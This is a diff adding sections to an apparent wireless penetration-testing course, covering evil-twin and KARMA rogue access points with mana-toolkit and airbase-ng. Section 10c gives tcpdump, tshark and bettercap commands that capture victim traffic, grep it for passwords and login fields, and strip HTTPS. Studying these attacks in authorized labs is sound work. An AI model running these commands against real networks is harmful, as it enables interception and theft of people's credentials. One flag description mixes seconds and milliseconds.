@@ -569,6 +569,81 @@ During authorized tests:
 
 ---
 
+## 10b. mana-toolkit — Dedicated KARMA Attack Suite
+
+The **MANA toolkit** (successor to KARMA) is a comprehensive rogue AP suite that improves on KARMA with better probe detection and more attack modes.
+
+```bash
+# Install
+sudo apt install mana-toolkit
+
+# Key scripts in /usr/share/mana-toolkit/run-mana/:
+# start-noupstream.sh    — No internet forwarding (credential only)
+# start-nat-simple.sh    — NAT forwarding with internet
+# start-nat-full.sh      — Full MITM with sslstrip and bdfproxy
+
+# Configure target SSID and channel in:
+# /etc/mana-toolkit/hostapd-karma.conf
+
+# Run full MITM evil twin
+sudo bash /usr/share/mana-toolkit/run-mana/start-nat-full.sh
+```
+
+## 10c. Traffic Interception & Credential Capture
+
+Once clients are connected through your evil twin, capture their traffic:
+
+```bash
+# Capture ALL victim traffic
+sudo tcpdump -i wlan1 -w victim_traffic.pcap
+
+# Filter HTTP POST requests (login forms)
+sudo tcpdump -i wlan1 -A -l port 80 | grep -i 'user\|pass\|login\|email'
+
+# Live DNS query monitoring (see what sites victim visits)
+sudo tshark -i wlan1 \
+  -Y "dns.qry.name" \
+  -T fields \
+  -e ip.src \
+  -e dns.qry.name
+
+# Watch for HTTP credentials in real-time with tshark
+sudo tshark -i wlan1 -Y "http.request.method==POST" \
+  -T fields -e ip.src -e http.request.uri -e http.file_data
+
+# SSL stripping (bettercap) — downgrades HTTPS to HTTP where possible
+# Inside bettercap shell:
+# set http.proxy.sslstrip true
+# http.proxy on
+# net.sniff on
+# Note: HSTS-preloaded domains (Google, banks) CANNOT be stripped
+```
+
+## 10d. Full airbase-ng Flag Reference
+
+```bash
+airbase-ng [options] <interface_in_monitor_mode>
+
+# Core flags:
+# -e <SSID>    → SSID to broadcast (match target)
+# -a <BSSID>   → Force specific BSSID (spoof legitimate AP MAC)
+# -c <channel> → Channel to operate on
+# -z <type>    → Cipher: 1=WEP, 2=WPA-TKIP, 3=WPA2, 4=WPA2-CCMP
+# -W 1         → Set WPA/WPA2 flag in beacon (required with -z)
+# -P           → KARMA mode: respond to all probe requests
+# -C <secs>    → Broadcast each discovered SSID for N seconds (with -P)
+# -I <secs>    → Beacon interval in ms (default: 100)
+# -v           → Verbose output (show all frames)
+# -A           → Ad-hoc mode (IBSS)
+# -M           → Transmit raw management frames only
+
+# WPA2 rogue AP example:
+sudo airbase-ng -e "CoffeeShop" -z 4 -W 1 -c 6 -a AA:BB:CC:DD:EE:FF wlan1mon
+
+# KARMA + WPA2:
+sudo airbase-ng -P -C 30 -z 4 -W 1 -e "default" wlan1mon
+```
+
 ## 11. Knowledge Check
 
 Before proceeding to Module 10, you should be able to answer:
